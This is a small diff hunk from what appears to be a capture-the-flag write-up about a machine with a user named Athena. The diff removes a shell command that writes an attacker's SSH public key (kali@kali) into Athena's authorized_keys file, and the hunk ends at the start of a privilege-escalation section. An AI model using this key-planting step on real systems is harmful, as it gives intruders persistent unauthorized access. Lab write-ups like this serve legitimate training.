@@ -262,14 +262,6 @@ Yours sincerely,
 Athena
 ```
 
-echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMa3SFT8EO51dS0QWDeuLzilfrmsB7g0zXPFFRB3TXAf kali@kali
-" > /home/athena/.ssh/authorized_keys
-
-
-
-
-
-
 # Priv Esc
 
 I have this sudo permission on the account Athena:
